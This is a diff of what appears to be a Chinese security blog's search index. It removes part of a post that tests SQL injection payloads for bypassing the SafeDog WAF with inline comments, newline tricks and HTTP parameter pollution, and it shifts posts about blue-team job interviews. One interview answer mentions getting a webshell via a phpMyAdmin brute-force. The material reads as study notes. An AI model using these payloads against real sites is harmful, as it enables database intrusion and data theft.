-<p><img src="/posts/3b69da4f/5.png"></p>
-<br>
-
-<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/posts/3b69da4f/9.png"></p>
-<p>无法绕过</p>
-<br>
-
-<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/posts/3b69da4f/10.png"></p>
-<p><code>tom%27/**/union/*!§10440§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
-<p>fuzz一下，发现91625以后的都可以绕过</p>
-<p><img src="/posts/3b69da4f/11.png"></p>
-<p><img src="/posts/3b69da4f/12.png"></p>
-<h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
-<p><img src="http3.png"></p>
-<p><img src="http4.png"></p>
-<br>
-
-<hr>
-<h5 id="database-、user-绕过"><a href="#database-、user-绕过" class="headerlink" title="database()、user()绕过"></a>database()、user()绕过</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
-<br>
-
-<p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
-<p><img src="/posts/3b69da4f/13.png"></p>
-<br>
-
-<hr>
-<h4 id="information-schema绕过"><a href="#information-schema绕过" class="headerlink" title="information_schema绕过"></a>information_schema绕过</h4><h5 id="使用内联注释-fuzz"><a href="#使用内联注释-fuzz" class="headerlink" title="使用内联注释+fuzz"></a>使用内联注释+fuzz</h5><p>没绕过</p>
-<h5 id="利用http参数污染"><a href="#利用http参数污染" class="headerlink" title="利用http参数污染"></a>利用http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
-<p><img src="http5.png"></p>
-<br>
-
-<hr>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
-<p>无waf情况下</p>
-<p><img src="/posts/3b69da4f/baocuo1.pmg"></p>
-<p>开启安全狗</p>
-<p><img src="/posts/3b69da4f/baocuo2.png"></p>
-<p>updataxml()会被拦截，中间加内联注释可以绕过</p>
-<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
-<p><img src="/posts/3b69da4f/baocuo3.png"></p>
-<p>但是</p>
-<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
-<p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
-<p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
-<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
-<p><img src="/posts/3b69da4f/baocuo4.png"></p>
-<br>
-
-<h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
-<p><img src="http6.png"></p>
-<p><img src="http7.png"></p>
-<br>
-
-<hr>
-<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
-<p><img src="/posts/3b69da4f/bool1.png"> </p>
-<p><img src="/posts/3b69da4f/bool2.png"></p>
-<br>
-
-<br>
-
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在此版本的安全狗(4.0.23.13)中，利用<strong>http参数污染</strong>都可以绕过</p>
-<p>有些也可以使用<strong>内联注释</strong>+<strong>fuzz</strong>+<strong>换行符</strong>进行绕过</p>
+    <title>记一次hw面试经历(2)</title>
+    <url>/posts/e9000575/</url>
+    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
+<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
+<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
+<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
+<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
+<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
+<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
 ]]></content>
       <categories>
-        <category>waf</category>
-        <category>SQLi</category>
+        <category>面试</category>
       </categories>
       <tags>
-        <tag>SQLi</tag>
-        <tag>waf</tag>
+        <tag>面试</tag>
       </tags>
   </entry>
   <entry>
@@ -2273,9 +2232,8 @@
 <p>可以使用十六进制绕过</p>
 <br>
 ##### http参数污染
-![](14.png)
-<br>
 
+<p><img src="/posts/d405928/14.png"><br><br></p>
 <hr>
 <br>
 
@@ -2360,66 +2318,6 @@
       <tags>
         <tag>SQLi</tag>
         <tag>waf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次hw面试经历(1)</title>
-    <url>/posts/40769f33/</url>
-    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
-<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
-<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
-<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
-<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
-<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
-<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
-<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
-<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
-<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
-<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
-<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
-<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
-<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
-<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
-<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
-<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
-<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
-<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
-<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
-<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
-<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
-<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
-<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
-<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
-<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
-<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
-<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
-<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
-<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
-<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次hw面试经历(2)</title>
-    <url>/posts/e9000575/</url>
-    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
-<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
-<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
-<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
-<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
-<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
-<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
       </tags>
   </entry>
   <entry>
